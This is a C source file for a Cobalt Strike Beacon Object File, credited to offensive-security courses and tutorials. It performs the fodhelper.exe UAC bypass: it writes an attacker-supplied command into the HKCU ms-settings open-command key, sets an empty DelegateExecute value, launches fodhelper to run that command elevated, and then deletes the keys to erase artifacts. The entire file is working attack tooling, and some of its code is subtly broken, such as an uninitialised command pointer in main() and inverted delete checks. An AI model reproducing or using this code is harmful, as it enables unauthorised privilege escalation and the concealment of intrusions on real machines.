/*
 fodhelper-bof modified by @mooolight

Credits:
 * - TrustedSec COFFLoader
 * - John Hammond's Beacon Object File Tutorial with BC Empire C2 
 * - Zero Point Security's CRTO I course - Extending Cobalt Strike module
 * - Heavily dependent on @cocomelonc's * Malware Development for Ethical Hackers => UAC evasion using fodhelper.exe
 * - VX-UG : VX-API -> UnusedSubroutineCleanupFodHelperArtifacts registry cleanup
 */
#include "fodhelper.h"

BOOL UnusedSubroutineCleanupFodHelperArtifacts(HKEY hKey) {
	if (!RegDeleteKeyExA(hKey, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\\", KEY_WOW64_64KEY, 0))
		return FALSE;

	if (!RegDeleteKeyExA(hKey, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\", KEY_WOW64_64KEY, 0))
		return FALSE;

	if (!RegDeleteKeyExA(hKey, "SOFTWARE\\Classes\\ms-settings\\shell\\", KEY_WOW64_64KEY, 0))
		return FALSE;

	if (!RegDeleteKeyExA(hKey, "SOFTWARE\\Classes\\ms-settings\\", KEY_WOW64_64KEY, 0))
		return FALSE;

	return TRUE;
}

#ifdef BOF

void go(char *args, int alen) {
	datap parser;
	char* command;    // "C:\\Windows\\System32\\cmd.exe"; -> default program
	char* delResult;
	
	// Prepare data parser
	BeaconDataParse(&parser, args, alen);
	
	// Unpack Data
	command = BeaconDataExtract(&parser, NULL);
	
	HKEY registryKey;
	DWORD disposition;

	const char* registryPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
	const char* delegateExecute = "";

	// Attempt to open the registry key
	LSTATUS status = RegCreateKeyExA(HKEY_CURRENT_USER, (LPCSTR)registryPath, 0, NULL, 
	0, KEY_WRITE, NULL, &registryKey, &disposition);
	BeaconPrintf(CALLBACK_OUTPUT, "%s" , status != ERROR_SUCCESS ? "[-] Failed to open or create the registry key.\n" : 
	"[+] Successfully created the registry key.\n");

	// Set the registry values
	status = RegSetValueExA(registryKey, "", 0, REG_SZ, (unsigned char*)command, strlen(command));
	BeaconPrintf(CALLBACK_OUTPUT, "%s" ,status != ERROR_SUCCESS ? "[-] Failed to set the registry value.\n" 
	: "[+] Successfully set the registry value.\n");

	status = RegSetValueExA(registryKey, "DelegateExecute", 0, REG_SZ, 
	(unsigned char*)delegateExecute, strlen(delegateExecute));
	BeaconPrintf(CALLBACK_OUTPUT, "%s" ,
	status != ERROR_SUCCESS ? "[-] Failed to set the registry value: DelegateExecute.\n" : 
	"[+] Successfully set the registry value: DelegateExecute.\n");

	// Start the fodhelper.exe program
	SHELLEXECUTEINFO shellExecuteInfo = { sizeof(shellExecuteInfo) };
	shellExecuteInfo.lpVerb = "runas";
	shellExecuteInfo.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
	shellExecuteInfo.hwnd = NULL;
	shellExecuteInfo.nShow = SW_NORMAL;

	if (!ShellExecuteExA(&shellExecuteInfo)) {
		DWORD error = GetLastError();
		BeaconPrintf (CALLBACK_OUTPUT, "%s" , error == ERROR_CANCELLED ? 
		"[-] The user refused to allow privilege elevation. Check the UAC configuration.\n" : 
		"[*] Unexpected error! Error code: %ld\n", error);
	}
	
	BeaconPrintf (CALLBACK_OUTPUT, "[+] Successfully created the elevated process...\n");
	
	BOOL bFlag = FALSE;
	
	if (!UnusedSubroutineCleanupFodHelperArtifacts(registryKey))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:
	if (registryKey)
		RegCloseKey(registryKey);
	
	return;
}

#else

int main() {
	char* command;    // "C:\\Windows\\System32\\cmd.exe"; -> default program
	char* delResult;
	
	HKEY registryKey;
	DWORD disposition;

	const char* registryPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
	const char* delegateExecute = "";

	// Attempt to open the registry key
	LSTATUS status = RegCreateKeyExA(HKEY_CURRENT_USER, (LPCSTR)registryPath, 0, NULL,	0, KEY_WRITE, NULL, &registryKey, &disposition);
	PRINT("%s" , status != ERROR_SUCCESS ? "[-] Failed to open or create the registry key.\n" : 
	"[+] Successfully created the registry key.\n");

	// Set the registry values
	status = RegSetValueExA(registryKey, "", 0, REG_SZ, (unsigned char*)command, strlen(command));
	PRINT("%s" ,status != ERROR_SUCCESS ? "[-] Failed to set the registry value.\n" 
	: "[+] Successfully set the registry value.\n");

	status = RegSetValueExA(registryKey, "DelegateExecute", 0, REG_SZ, 
	(unsigned char*)delegateExecute, strlen(delegateExecute));
	PRINT("%s" ,
	status != ERROR_SUCCESS ? "[-] Failed to set the registry value: DelegateExecute.\n" : 
	"[+] Successfully set the registry value: DelegateExecute.\n");

	// Start the fodhelper.exe program
	SHELLEXECUTEINFO shellExecuteInfo = { sizeof(shellExecuteInfo) };
	shellExecuteInfo.lpVerb = "runas";
	shellExecuteInfo.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
	shellExecuteInfo.hwnd = NULL;
	shellExecuteInfo.nShow = SW_NORMAL;

	if (!ShellExecuteExA(&shellExecuteInfo)) {
		DWORD error = GetLastError();
		PRINT("%s" , error == ERROR_CANCELLED ? 
		"[-] The user refused to allow privilege elevation. Check the UAC configuration.\n" : 
		"[*] Unexpected error! Error code: %ld\n", error);
	}
	
	PRINT("[+] Successfully created the elevated process...\n");
	
	BOOL bFlag = FALSE;
	
	if (!UnusedSubroutineCleanupFodHelperArtifacts(registryKey))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:
	if (registryKey)
		RegCloseKey(registryKey);
	return;
}

#endif